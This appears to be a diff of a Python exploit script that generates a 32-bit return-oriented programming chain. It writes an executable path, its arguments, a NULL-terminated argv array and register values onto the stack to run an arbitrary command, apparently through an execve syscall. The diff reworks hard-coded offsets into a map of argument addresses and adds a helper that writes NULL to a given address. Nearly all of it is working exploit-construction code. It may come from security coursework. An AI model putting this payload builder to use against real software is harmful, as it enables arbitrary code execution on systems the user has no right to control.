@@ -2,7 +2,6 @@
 from struct import pack
 import subprocess
 import os
-import sys
 import pprint as pp
 
 # run ROPgadget tool to get useful rop gadgets
@@ -133,10 +132,11 @@ def setA(pointer):
     
     return buff
 
-def pushNull(pointer):
+def pushNULLbyOffset(offset):
     buff = bytes('', 'ascii')
     buff += POPDST
-    buff += pack("<I", STACKADDR + pointer)
+    print('NULL: ', STACKADDR + offset, '\n')
+    buff += pack("<I", STACKADDR + offset)
     buff += addPadding(rop_gadgets['popDst'][1], {})
 
     buff += XORSRC
@@ -146,6 +146,19 @@ def pushNull(pointer):
     buff += addPadding(rop_gadgets['mov'][1], {})
     return buff
 
+def pushNULLonAddress(address):
+    buff = bytes('', 'ascii')
+    buff += POPDST
+    print('NULL: ', address, '\n')
+    buff += pack("<I", address)
+    buff += addPadding(rop_gadgets['popDst'][1], {})
+
+    buff += XORSRC
+    buff += addPadding(rop_gadgets['xorSrc'][1], {})
+
+    buff += MOV
+    buff += addPadding(rop_gadgets['mov'][1], {})
+    return buff
 
 def addPadding(gadget, regsSet):
     result = bytes('', 'ascii')
@@ -205,15 +218,18 @@ for _ in range(int(len(exec)/4)):
     stack_addr_pointer += 4
 
 # push a NULL onto the stack after command is on stack 
-p += pushNull(stack_addr_pointer)
+p += pushNULLbyOffset(stack_addr_pointer)
 stack_addr_pointer += 1
 
 # ===================================================================================
 # *argv[] section
 # ===================================================================================
 
+arg_addresses = {exec : STACKADDR}
+
 for i in range(len(args)):
     arg = args[i]
+    arg_addresses[arg] = STACKADDR + stack_addr_pointer
     arg_correct_length = len(arg) % 4
     # print('args_size: ', arg_missing_length, '\n')
     if arg_correct_length != 0:
@@ -224,7 +240,7 @@ for i in range(len(args)):
     arg_pointer = 0
 
     for j in range(arg_size):
-        print('arg_pointer: ', arg_pointer, '\n')
+
         p += POPDST
         p += pack("<I", STACKADDR + stack_addr_pointer)
         p += addPadding(rop_gadgets['popDst'][1], {})
@@ -244,10 +260,14 @@ for i in range(len(args)):
             stack_addr_pointer += 4
         print('stack_pointer_after: ', stack_addr_pointer, '\n')
     print('point: ', stack_addr_pointer, '\n')
-    p += pushNull(stack_addr_pointer)
+    p += pushNULLbyOffset(stack_addr_pointer)
     stack_addr_pointer += 1
-stack_addr_pointer -= 1
 
+stack_addr_pointer -= 1 # we want to point at address containing full \0
+arg_addresses['NULL'] = STACKADDR + stack_addr_pointer
+
+# print('--------------------------------------\n')
+# pp.pprint(arg_addresses)
 # uncomment for working code 
 
 # p += POPDST
@@ -288,54 +308,76 @@ stack_addr_pointer -= 1
 # ===================================================================================
 
 # shadow stack
-shadow_pointer = 60
-p += POPDST
-p += pack("<I", STACKADDR + shadow_pointer)
-p += addPadding(rop_gadgets['popDst'][1], {})
+# print('NULL before: ', arg_addresses['NULL'] + 4, '\n')
+shadow_stack_address = arg_addresses['NULL'] + 4
+arg_addresses['SHADOW_STACK'] = shadow_stack_address
+# p += pushNULLonAddress(shadow_stack_address) # possibly not necessary
 
-p += POPSRC
-p += pack('<I', STACKADDR)
-p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_pointer})
+for i in range(len(command_line)):
+    p += POPDST
+    p += pack("<I", shadow_stack_address)
+    p += addPadding(rop_gadgets['popDst'][1], {})
 
-p += MOV
-p += addPadding(rop_gadgets['mov'][1], {})
-shadow_pointer += 4
+    p += POPSRC
+    if i == 0:
+        p += pack('<I', arg_addresses[exec])
+    else:
+        p += pack('<I', arg_addresses[args[i - 1]])
+    p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_stack_address})
 
-p += POPDST
-p += pack("<I", STACKADDR + shadow_pointer)
-p += addPadding(rop_gadgets['popDst'][1], {})
+    p += MOV
+    p += addPadding(rop_gadgets['mov'][1], {})
+    shadow_stack_address += 4
+shadow_stack_address -= 4
 
-p += POPSRC
-p += pack('<I', STACKADDR + 9)
-p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_pointer})
+# p += POPDST
+# p += pack("<I", shadow_stack_address)
+# p += addPadding(rop_gadgets['popDst'][1], {})
 
-p += MOV
-p += addPadding(rop_gadgets['mov'][1], {})
-shadow_pointer += 4
+# p += POPSRC
+# p += pack('<I', arg_addresses[exec])
+# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_stack_address})
 
-p += POPDST
-p += pack("<I", STACKADDR + shadow_pointer)
-p += addPadding(rop_gadgets['popDst'][1], {})
+# p += MOV
+# p += addPadding(rop_gadgets['mov'][1], {})
+# shadow_stack_address += 4
 
-p += POPSRC
-p += pack('<I', STACKADDR + 12)
-p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_pointer})
+# p += POPDST
+# p += pack("<I", shadow_stack_address)
+# p += addPadding(rop_gadgets['popDst'][1], {})
 
-p += MOV
-p += addPadding(rop_gadgets['mov'][1], {})
+# p += POPSRC
+# p += pack('<I', arg_addresses[args[0]])
+# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_stack_address})
 
-# TODO: put a null after 
+# p += MOV
+# p += addPadding(rop_gadgets['mov'][1], {})
+# shadow_stack_address += 4
+
+# p += POPDST
+# p += pack("<I", shadow_stack_address)
+# p += addPadding(rop_gadgets['popDst'][1], {})
+
+# p += POPSRC
+# p += pack('<I', arg_addresses[args[1]])
+# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_stack_address})
+
+# p += MOV
+# p += addPadding(rop_gadgets['mov'][1], {})
+
+# TODO: put a null after
+p += pushNULLonAddress(shadow_stack_address + 4)
 
 p += POPB
-p += pack("<I", STACKADDR)
+p += pack("<I", arg_addresses[exec])
 p += addPadding(rop_gadgets['popB'][1], {})
 
 p += POPC
-p += pack("<I", STACKADDR + 60)
+p += pack("<I", arg_addresses['SHADOW_STACK'])
 p += addPadding(rop_gadgets['popC'][1], {'ebx': 0})
 
 p += POPD
-p += pack("<I", STACKADDR + 14)
+p += pack("<I", arg_addresses['NULL'])
 p += addPadding(rop_gadgets['popD'][1], {'ebx': 0, 'ecx': stack_addr_pointer})
 
 p += setA(stack_addr_pointer)
